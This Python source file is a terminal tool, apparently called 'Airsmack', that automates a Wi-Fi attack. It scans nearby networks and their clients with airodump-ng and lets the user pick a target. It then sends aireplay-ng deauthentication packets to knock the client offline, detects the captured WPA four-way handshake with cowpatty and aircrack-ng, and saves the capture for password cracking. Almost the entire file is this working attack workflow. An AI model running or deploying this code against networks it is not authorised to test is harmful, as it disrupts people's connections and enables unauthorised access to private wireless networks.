#!/usr/bin/env python3

from datetime import datetime
from multiprocessing import Process
from simple_term_menu import TerminalMenu
from utils import arguments
from utils import mkdir
from utils import richard as r
import csv
import json
import logging
import os
import psutil
import shutil
import subprocess
import sys
import time


# Argparse - Init and parse.
args = arguments.parser.parse_args()

# App - absolute filepaths.
app_fp = __file__
app_dir = os.path.dirname(__file__)

# Relative directories and filepaths.
RESULTS_DIR = 'results'
TMP_DIR = '.tmp'

# Application - create required dirs.
directories = [RESULTS_DIR, TMP_DIR]
dirs = [mkdir.mkdir(directory) for directory in directories]
if args.loglevel == 'info'.upper():
    [print(f'[*] Created directory: {d}') for d in dirs if d is not None]


class BaseMenu:
    opt_exit = "[-] Exit"
    opt_back = "[-] Back"
    
    OPTIONS = [
        opt_back
    ]

    def __init__(self, menu_options):
        self.menu_options = menu_options
        self.menu_options = [i for i in self.menu_options] + [self.opt_exit]
        self.menu = TerminalMenu(self.menu_options)

    def present_menu(self):
        index = self.menu.show()
        selected_menu_item = self.menu_options[index]
        return selected_menu_item, index


class ClientMenu(BaseMenu):
    def __init__(self, menu_options):
        super().__init__(menu_options)
        self.menu_options = [i for i in self.menu_options] + [self.opt_back]
        self.menu = TerminalMenu(self.menu_options)


def print_banner():
    os.system('clear')
    r.console.print(r.Panel(r.Syntax(
    f"""
       / \\(((_)))___ ___  ___ _    __    ___ __ __
      / _ \\ | | '__/ __| '_ ` _ \\ / _` |/ __| |/ /
     / ___ \\| | |  \\__ \\ | | | | | (_| | (__|   < 
    /_/   \\_\\_|_|  |___/_| |_| |_|\\__,_|\\___|_|\\_\\
    """,
    "notalanguage",
    word_wrap=False)))


def clear_tmp_directory(directory=".tmp"):
    """Removes all files from the specified .tmp directory"""
    if not os.path.exists(directory):
        logging.debug(f'[!] Directory does not exist: {directory}')
        return
    for filename in os.listdir(directory):
        file_path = os.path.join(directory, filename)
        try:
            if os.path.isfile(file_path):
                os.remove(file_path)
                logging.debug(f'Deleted: {file_path}')
                # Handles nested directories
            elif os.path.isdir(file_path):
                shutil.rmtree(file_path)
                logging.debug(f'Deleted directory: {file_path}')
        except Exception as e:
            logging.debug(f'Error deleting {file_path}: {e}')


def run_channel_hopping(interface: str, write_interval: int, prefix_file_path: str):
    ''' Runs airodump-ng in channel hopping node via a subprocess.'''
    cmd_string = f'airodump-ng {interface} --wps --band abg -a --write-interval {write_interval} -w {prefix_file_path}'
    try:
        command = cmd_string.split(' ')
        process = subprocess.Popen(command, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
        process.wait()
    except Exception as e:
        print(f'{e}')
    except KeyboardInterrupt:
        print('Detected [Ctrl-C]')
        process.terminate()
        process.wait()


def run_airodump(interface: str, channel: str, prefix_file_path: str):
    ''' Runs airodump-ng in a subprocess.'''
    cmd_string = f'airodump-ng {interface} -c {channel} --band abg -w {prefix_file_path}'
    try:
        command = cmd_string.split(' ')
        process = subprocess.Popen(command, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE, text=True)
        process.wait()
    except Exception as e:
        print(f'{e}')
    except KeyboardInterrupt:
        # print('Detected [Ctrl-C]')
        process.terminate()
        process.wait()


def run_aireplay(packets: str, bssid: str, client: str, interface: str) -> tuple[subprocess.Popen, list[str]]:
    ''' Runs aireplay-ng in a subprocess.'''
    command = ['aireplay-ng', '-0', packets, '-a', bssid, '-c', client, '--ignore-negative-one', interface]
    # print(f'Aireplay-ng Command: {' '.join(command)}\n')
    try:
        process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        return process, command
    except Exception as e:
        print(f"Error starting aireplay-ng: {e}")
        return None


def run_cowpatty(cap_file_path):
    ''' Runs cowpatty in a subprocess.'''
    # End of pcap capture file, incomplete four-way handshake exchange.  Try using a different capture.
    command = ['cowpatty', '-r', cap_file_path, '-c']
    process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    # Monitor output for handshake confirmation
    try:
        for line in iter(process.stdout.readline, ''):
            # print(line.strip())
            if 'Collected all necessary data to mount crack against WPA2/PSK passphrase.' in line:
                return True
        return False
    except KeyboardInterrupt:
        print('Detected [Ctrl-C]')
        process.terminate()
        process.wait()


def run_aircrack(cap_file_path, bssid, dictionary):
    ''' Runs cowpatty in a subprocess.'''
    command = ['aircrack-ng', cap_file_path, '-b', bssid, '-w', dictionary, '-q']
    process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    # Checks for matching target BSSID in CAP file.
    try:
        for line in iter(process.stdout.readline, ''):
            if 'KEY NOT FOUND' in line:
                return True
        return False
    except KeyboardInterrupt:
        print('Detected [Ctrl-C]')
        process.terminate()
        process.wait()


def find_processes_by_name(process_name):
    '''Finds all running instances of a process'''
    found = []
    for proc in psutil.process_iter(attrs=["pid", "name"]):
        if process_name.lower() in proc.info["name"].lower():
            found.append(proc.info)
    return found


def terminate_processes(process_name):
    '''Terminates all matching processes'''
    processes = find_processes_by_name(process_name)
    if not processes:
        print(f'No active processes named: {process_name}')
        return
    for proc in processes:
        try:
            print(f'Terminating {proc['name']} (PID: {proc['pid']})')
            force_kill_process(proc['pid'])
        except psutil.NoSuchProcess:
            print(f"Process {proc['pid']} already exited.")
        except psutil.AccessDenied:
            print(f"Permission denied for PID {proc['pid']}—try running with sudo.")


def terminate_process_tree(pid):
    '''Kill a process and all its children'''
    try:
        parent = psutil.Process(pid)
        children = parent.children(recursive=True)
        for child in children:
            logging.debug(f'Terminating child process: {child.pid}')
            child.terminate()
        parent.terminate()
        logging.debug(f'Process and its children terminated: {pid}')
    except psutil.NoSuchProcess:
        logging.debug(f'Process already exited: {pid}')


def force_kill_process(pid):
    ''' Used in terminate_processes(process_name) to ensure processes are teminated.'''
    try:
        parent = psutil.Process(pid)
        children = parent.children(recursive=True)
        for child in children:
            child.kill()
        parent.kill()
        print(f'Killed PID and its subprocesses: {pid}')
    except psutil.NoSuchProcess:
        print(f'Process already exited: {pid}')


def read_csv(csv_file_path: str) -> tuple[list[dict], list[dict]]:
    ''' Parse Airodump's CSV into the dicts networks and clients'''
    try:
        with open(csv_file_path, mode='r', encoding='utf-8') as csvfile:
            csv_reader = csv.reader(csvfile)
            networks, clients = [], []
            current_section = None
            for row in csv_reader:
                # Identify section headers
                if 'BSSID' in row and ' ESSID' in row and ' Privacy' in row:
                    current_section = 'networks'
                    continue
                elif 'Station MAC' in row and ' BSSID' in row:
                    current_section = 'clients'
                    continue
                # Parse rows into dictionaries
                if current_section == 'networks' and len(row) >= 5:
                    # Note: modifying row indices breaks order/script.
                    networks.append({
                        'BSSID': row[0],
                        'Channel': str(row[3]),
                        'Power': str(row[8]),
                        'ESSID': str(row[13]),
                        'Privacy': row[5]
                    })
                elif current_section == 'clients' and len(row) >= 3:
                    # Note, modifying row indices breaks order/script.
                    clients.append({
                        'Station MAC': str(row[0]),
                        'BSSID': str(row[5]),
                        'Power': str(row[3]),
                        'Probed ESSID': str(row[6])
                    })
    except FileNotFoundError:
        print('Error: CSV file not found.')
    except PermissionError:
        print('Error: Permission denied when accessing CSV.')
    except Exception as e:
        print(f'Unexpected error while reading CSV: {e}')
    return networks, clients


def monitor_csv():
    global last_modified
    processed_rows = set()   
    while True:
        modified_time = os.path.getmtime(csv_file_path)
        if last_modified is None or modified_time > last_modified:
            last_modified = modified_time
            os.system('clear')
            print("\n[Update Detected] Checking for new associated clients...")
        time.sleep(1)  # Check for updates every second


def get_networks(networks:list, clients:list) -> str:
    ''' Convert Airodump dicts to JSON and include SSIDs '''
    networks_with_clients = {network['BSSID']: 
    {
        'ESSID': network['ESSID'].strip(),
        'Privacy': network['Privacy'].strip(), 
        'Channel': network['Channel'].strip(), 
        'Clients': []} for network in networks
    }
    # Include SSID for easier readability.
    for client in clients:
        for network in networks:
            if network['BSSID'] in client['BSSID']:
                if network['ESSID'] != ' ':
                    # Append 'clients'.
                    networks_with_clients[client['BSSID'].strip()]['Clients'].append(client['Station MAC'])
    # Convert to list.
    network_clients_list = [{'BSSID': key, 'ESSID': value['ESSID'], 'Clients': value['Clients']} for key, value in networks_with_clients.items()]

    # Combine into JSON structure
    json_data = {"networks": networks_with_clients}
    return json.dumps(json_data, indent=4)


def save_cap_file(source:str, destination_folder:str, essid:str) -> str:
    ''' Move cap file and rename it with ESSID and a timestamp'''
    timestamp = datetime.now().strftime("%B-%d-%Y_%H:%M:%S")
    filename = os.path.basename(source)
    new_filename = f"{essid}_{timestamp}{os.path.splitext(filename)[1]}"
    destination_path = os.path.join(destination_folder, new_filename)
    shutil.move(source, destination_path)
    return destination_path


def main():
    # Airodump Variables.
    prefix_file_path = os.path.join(TMP_DIR, 'output')
    csv_file_path = f'{prefix_file_path}-01.csv'
    write_interval = 1
    interface = args.interface
    packets = args.packets
    aircrack_dictionary = f'.dict'

    print_banner()

    # Process sanity check.
    try:
        processes = find_processes_by_name("airodump-ng")
        if processes:
            r.console.print("[or][!][/or] Found one or more existing Airodump-ng processes running on the system.")
            for proc in processes:
                print(f'    - {proc['name']} (PID: {proc['pid']})')
            option = input('(Q)uit / <ENTER> to kill processes and continue...\n')
            if option.upper() == '':
                # Kills all instances of Airodump-ng
                terminate_processes('airodump-ng')
                input('Press <ENTER> to continue...\n')
            elif option.upper() == 'Q':
                sys.exit(0)
    except KeyboardInterrupt:
        print('Detected [Ctrl-C]')
        sys.exit()
    
    # Clear tmp files on start.
    clear_tmp_directory()

    # Start Channel hopping Process.
    channel_hopping = Process(target=run_channel_hopping, args=(interface, write_interval, prefix_file_path))
    channel_hopping.start()
    time.sleep(write_interval + 1)
    
    with r.console.status(spinner='dots', status=f'Monitoring wireless networks for clients...\n  Press [Ctrl-C] to stop the scan\n', spinner_style='or') as status:
        try:
            last_modified = None
            while True:
                print_banner()
                modified_time = os.path.getmtime(csv_file_path)
                if last_modified is None or modified_time > last_modified:
                    last_modified = modified_time
                    print_banner()
                    if os.path.exists(csv_file_path):
                        # Parse Airodump CSV into tuple[list[dict], list[dict]].
                        networks, clients = read_csv(csv_file_path)
                        # Convert into JSON data which now includes SSIDs.
                        networks_ssid = json.loads(get_networks(networks, clients))
                        # Filter networks that only contain active clients.
                        networks_clients = {k: v for k, v in networks_ssid["networks"].items() if v["Clients"]}
                        # Convert to list for use with simple_term_menu. 
                        main_menu_options = [f'[-] {k}, Ch {v['Channel']}, {v['Privacy']}, {v['ESSID']}, Clients {v['Clients']}' for k, v in networks_clients.items()]
                        [print(option) for option in main_menu_options]
                    else:
                        print(f'Files does not exists: {csv_file_path}')
                time.sleep(1)
        except KeyboardInterrupt:
            print('Detected [Ctrl-C]')
    
    # Terminate Channel hopping.
    channel_hopping.terminate()
    channel_hopping.join()
    time.sleep(1)
        
    try:
        while True:
            # Main-menu
            print_banner()
            main_menu = BaseMenu(main_menu_options)
            selected_main_menu_item, selected_main_menu_index = main_menu.present_menu()
            logging.debug(f"Main Menu Option Selected: {selected_main_menu_item}")
            # Exit option.
            if selected_main_menu_item == '[-] Exit':
                sys.exit()
            # Selected BSSID.
            selected_bssid = list(networks_clients.keys())[selected_main_menu_index]
            # Client submenu list for the selected BSSID.
            clients_lst = networks_clients[selected_bssid]["Clients"]
        
            if selected_main_menu_item != '[-] Exit':
                # print(f'{selected_main_menu_item}')
                prefix_removed = selected_main_menu_item.split(' ', 1)[1]
                # print(prefix_removed)
                bssid = prefix_removed.split(',')[0].strip()
                # print(bssid)
                ch_channel = selected_main_menu_item.split(',')[1].strip()
                channel = ch_channel.split(' ')[1]
                # print(channel)
                privacy = selected_main_menu_item.split(',')[2].strip()
                # print(privacy)
                essid = selected_main_menu_item.split(',')[3].strip()
                # print(essid)
                clients = selected_main_menu_item.split(',')[4].strip()
                clients = clients.split(' ')[1].lstrip("['")
                client = clients.split(' ')[0].rstrip("'']")
                # print(client)

                # Sub-menu
                if len(clients_lst) > 1:
                    while True:
                            client_menu = ClientMenu(clients_lst)
                            selected_client_menu_item, selected_client_menu_index = client_menu.present_menu()
                            logging.debug(f"Selected Client: {selected_client_menu_item}")
                            # Back option.
                            if selected_client_menu_item == '[-] Back':
                                break
                            # Exit option.
                            elif selected_client_menu_item == '[-] Exit':
                                sys.exit()
                            elif  selected_client_menu_item == '[-] Select All Clients':
                                # DEV Include Deauth all client option.
                                pass
                            else:
                                client = selected_client_menu_item.strip()
                                break

                # Print - Target Selected
                r.console.print(r.Panel(r.Syntax(
                f"""\
                \n BSSID: {bssid}\
                \n Channel: {channel}\
                \n Encryption: {privacy}\
                \n SSID: {essid}\
                \n Client(s): {client}\
                \n """,
                "notalanguage",
                word_wrap=False),
                title="Target", 
                title_align="left"))

                # Clear tmp files before running Airodump-ng capture.
                clear_tmp_directory()

                # Airodump-ng Multiprocess.
                airodump = Process(target=run_airodump, args=(interface, channel, prefix_file_path))
                airodump.start()
                time.sleep(1)

                # Aireplay-ng Subprocess.
                with r.console.status(spinner='dots', status=f'Aireplay-ng running...', spinner_style='or') as status:
                    aireplay_process = run_aireplay(packets, bssid, client, interface)[0]
                    aireplay_command = ' '.join(run_aireplay(packets, bssid, client, interface)[1])
                    if aireplay_process:
                        logging.debug(f'Aireplay-ng Subprocess: {aireplay_process.pid}')
                        r.console.print(r.Panel(r.Syntax(
                        f"""\
                        \n {aireplay_command}\
                        \n """,
                        "notalanguage",
                        word_wrap=False),
                        title="Aireplay-ng", 
                        title_align="left"))
                        # Aireplay's stdout
                        try:
                            for line in iter(aireplay_process.stdout.readline, b""):
                                print(line.decode().strip())
                            aireplay_process.terminate()
                            aireplay_process.wait()
                            # time.sleep(1)
                        except Exception as e:
                            print(f'{e}')
                
                with r.console.status(spinner='dots', status=f'Airodump-ng running...\n  Press [Ctrl-C] to stop\n', spinner_style='or') as status:
                    # Cowpatty continously reads CAP file.
                    while True:
                        found = run_cowpatty(f'{prefix_file_path}-01.cap')
                        if found:
                            break
                        time.sleep(1)
                    r.console.print(f' [or][✔][/or] Captured a Four-way Handshake!')
                    
                    # Aircrack-ng verify four-way handshake for target BSSID/ESSID.
                    found = run_aircrack(f'{prefix_file_path}-01.cap', bssid, aircrack_dictionary)
                    if found:
                        r.console.print(f' [green][✔][/green] Four-way Handshake is most likely for: [gold3]{bssid}, {essid}')
                    else:
                        r.console.print(f' [bold red][X][/bold red] Four-way Handshake is NOT for: [gold3]{bssid}, {essid}')
                        essid = 'UNKNOWN'

                # Save cap file.
                time.sleep(2)
                cap_file_path = save_cap_file(f'{prefix_file_path}-01.cap', RESULTS_DIR, essid)
                terminate_process_tree(airodump.pid)
                r.console.print(f' Capture file moved to: [repr.path]{cap_file_path}')
                # Clear tmp files on exit.
                clear_tmp_directory()
                # Kill process tree.
                time.sleep(2)
                input(f'\n Press <ENTER> to exit\n')
                break
    except KeyboardInterrupt:
        print('Detected [Ctrl-C]')
        # Kill process tree.
        force_kill_process(airodump.pid)
        # Clear tmp files on exit.
        clear_tmp_directory()

if __name__ == "__main__":
    main()
